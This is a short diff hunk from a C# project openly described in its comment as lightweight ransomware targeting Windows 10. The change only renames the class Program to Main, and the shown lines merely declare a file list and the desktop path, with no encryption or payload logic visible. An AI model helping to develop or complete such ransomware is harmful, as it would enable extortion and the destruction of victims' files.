@@ -13,7 +13,7 @@ namespace Ransomware10
     /// The Fastest Most Lightweight Ransomware Targetting Windows 10. @Choudai
     /// </summary>
     
-    class Program
+    class Main
     {
         private static string[] Files = null;
         private static string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
